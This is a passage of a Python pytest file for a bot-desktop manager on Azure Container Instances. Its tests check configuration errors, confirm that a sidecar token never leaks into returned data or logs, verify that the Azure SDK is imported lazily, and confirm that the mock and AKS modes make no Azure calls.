    db, bot_a, monkeypatch
):
    groups = FakeContainerGroups()
    manager = aci_manager(monkeypatch, groups, aci_registry_identity="")

    desktop = await manager.start(db, bot_a)

    assert desktop.state == "error"
    assert "aci_registry_identity" in desktop.last_error
    assert "username/password" in desktop.last_error
    assert groups.created == []


@pytest.mark.parametrize(
    "missing", ["aci_subscription_id", "aci_resource_group", "aci_region", "bot_desktop_image"]
)
async def test_an_unconfigured_setting_names_itself(db, bot_a, monkeypatch, missing):
    groups = FakeContainerGroups()
    manager = aci_manager(monkeypatch, groups, **{missing: ""})

    desktop = await manager.start(db, bot_a)

    assert desktop.state == "error"
    assert missing in desktop.last_error
    assert groups.created == []


# ---------------------------------------------------------------------------
# The token reaches nothing a human or a log can read
# ---------------------------------------------------------------------------


async def test_the_sidecar_token_never_appears_in_a_returned_dict(db, bot_a, monkeypatch):
    manager = aci_manager(monkeypatch, FakeContainerGroups())
    info = await manager._aci_start(a_bot())
    assert SIDECAR_TOKEN not in json.dumps(info)

    desktop = await manager.start(db, bot_a)
    row = {
        "state": desktop.state,
        "container_id": desktop.container_id,
        "stream_url": desktop.stream_url,
        "control_url": desktop.control_url,
        "last_error": desktop.last_error,
    }
    assert SIDECAR_TOKEN not in json.dumps(row)


async def test_the_sidecar_token_never_appears_in_a_log_line(db, bot_a, monkeypatch, caplog):
    manager = aci_manager(monkeypatch, FakeContainerGroups())
    with caplog.at_level(logging.DEBUG):
        await manager.start(db, bot_a)
        await manager.suspend(db, bot_a.id)
        await manager.resume(db, bot_a.id)
        await manager.stop(db, bot_a.id, wipe=True)
    assert SIDECAR_TOKEN not in caplog.text


@pytest.mark.parametrize("failure", ["create", "get", "delete", "stop", "start"])
async def test_no_failure_path_leaks_the_token_or_raises(db, bot_a, monkeypatch, caplog, failure):
    """Every driver call fails in turn; the operator-visible text carries no secret."""
    groups = FakeContainerGroups(fail_on=failure)
    manager = aci_manager(monkeypatch, groups, aci_start_timeout_seconds=0)

    with caplog.at_level(logging.DEBUG):
        started = await manager.start(db, bot_a)
        suspended = await manager.suspend(db, bot_a.id)
        resumed = await manager.resume(db, bot_a.id)
        stopped = await manager.stop(db, bot_a.id)

    for row in (started, suspended, resumed, stopped):
        assert SIDECAR_TOKEN not in (row.last_error or "")
        assert row.state in {"absent", "error", "running", "starting", "suspended"}
    assert SIDECAR_TOKEN not in caplog.text


# ---------------------------------------------------------------------------
# The dependency stays lazy
# ---------------------------------------------------------------------------


def test_the_azure_sdk_is_imported_inside_the_methods_only():
    """A mock or docker deployment must never load azure-mgmt-containerinstance."""
    source = Path(desktop_module.__file__).read_text(encoding="utf-8")
    tree = ast.parse(source)
    top_level: list[str] = []
    for node in tree.body:
        if isinstance(node, ast.Import):
            top_level += [alias.name for alias in node.names]
        elif isinstance(node, ast.ImportFrom):
            top_level.append(node.module or "")
    assert not [name for name in top_level if name.startswith("azure")], top_level
    assert "from azure.mgmt.containerinstance import" in source, "...but it is imported somewhere"


def test_the_azure_pin_is_in_requirements():
    api_root = Path(desktop_module.__file__).resolve().parents[2]
    requirements = (api_root / "requirements.txt").read_text(encoding="utf-8")
    assert re.search(r"^azure-mgmt-containerinstance==\d+\.\d+\.\d+$", requirements, re.MULTILINE)


# ---------------------------------------------------------------------------
# The other modes are untouched
# ---------------------------------------------------------------------------


async def test_mock_mode_makes_no_azure_calls(db, bot_a, monkeypatch):
    groups = FakeContainerGroups()
    manager = aci_manager(monkeypatch, groups, bot_desktop_mode="mock")

    desktop = await manager.start(db, bot_a)

    assert desktop.state == "running"
    assert desktop.container_id == f"mock-{bot_a.slug}"
    assert (groups.created, groups.gets, groups.deleted) == ([], [], [])


async def test_aks_mode_still_records_pending(db, bot_a, monkeypatch):
    groups = FakeContainerGroups()
    manager = aci_manager(monkeypatch, groups, bot_desktop_mode="aks")

    desktop = await manager.start(db, bot_a)

    assert desktop.state == "starting"
    assert desktop.container_id == f"aks-pending-{bot_a.id}"
    assert groups.created == []


def test_the_group_readers_survive_a_partial_response():
    """ARM omits instance views early; the poll loop must not blow up on that."""
    assert aci_container_state(SimpleNamespace()) == ("", "")
    assert aci_private_ip(SimpleNamespace()) == ""
    assert aci_is_running(SimpleNamespace()) is False
    assert aci_is_running(fake_group()) is True


def test_the_poll_loop_yields_instead_of_blocking_the_event_loop():
    """30-90 seconds of cold pull must not freeze the API."""
    source = Path(desktop_module.__file__).read_text(encoding="utf-8")
    body = source.split("async def _aci_wait_for_running")[1].split("\n    def ")[0]
    assert "await asyncio.sleep" in body
    assert "time.sleep" not in body
    assert asyncio.iscoroutinefunction(DesktopManager._aci_wait_for_running)
